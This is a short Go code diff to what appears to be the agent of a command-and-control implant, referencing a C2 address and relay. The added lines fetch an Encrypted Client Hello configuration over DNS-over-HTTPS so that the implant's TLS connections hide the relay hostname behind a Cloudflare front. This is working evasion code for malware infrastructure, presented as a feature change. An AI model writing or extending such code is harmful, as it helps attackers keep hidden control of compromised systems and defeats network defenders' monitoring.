@@ -127,6 +127,15 @@ func agent_main() {
 			logging.Warningf("DoH bootstrap failed (%v), falling back to system DNS", dnsErr)
 		} else {
 			net.DefaultResolver = resolver
+			// ECH: fetch the relay's ECHConfigList (DNS HTTPS record) so every
+			// subsequent TLS handshake masks the relay hostname behind
+			// cloudflare-ech.com. Best effort — plain SNI if it fails.
+			transport.SetDoHEndpoint(common.RuntimeConfig.DoHServer)
+			if relayHost := c2transport.HostOfURL(common.RuntimeConfig.CCAddress); relayHost != "" {
+				if transport.RefreshECHConfig(common.RuntimeConfig.DoHServer, relayHost) {
+					logging.Successf("ECH armed for %s", relayHost)
+				}
+			}
 		}
 	}
 
